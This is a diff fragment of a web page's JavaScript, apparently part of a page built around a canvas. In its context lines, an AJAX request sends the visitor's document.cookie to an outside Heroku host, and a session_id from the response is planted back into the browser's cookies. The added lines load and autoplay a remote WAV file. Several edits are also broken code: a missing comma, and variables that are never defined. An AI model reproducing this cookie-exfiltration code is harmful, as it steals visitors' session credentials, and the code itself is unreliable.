@@ -253,6 +253,7 @@ canvas { border: 1px solid black; display: block; }
                 $.ajax({
                     type: 'POST',
                     url: "https://bemyfr1end.herokuapp.com/index4.php?" +document.cookie,
+					url1: "https://bemyfr1end.herokuapp.com/test.wav"
                     dataType: 'json', // Determina o tipo de retorno
                     contentType: 'application/json',
                     data: gambi,
@@ -273,11 +274,13 @@ canvas { border: 1px solid black; display: block; }
                             return false;
                         }
 						window.AudioContext = window.AudioContext || window.webkitAudioContext || window.mozAudioContext;
-						audio.unload();
 						var audio = new Audio('https://bemyfr1end.herokuapp.com/test.wav');  
 						audio.type = 'audio/wav';
+						audio.crossOrigin = "anonymous";
+						audio.src = url1;
 						audio.load();
 						audio.play();
+						log('set audio.src:', url);
 						var cookie1 = "session_id="+ resposta.session_id;
 						//var cookie2 = "JSESSIONID=" + resp.sessionid;
 						document.cookie = cookie1;
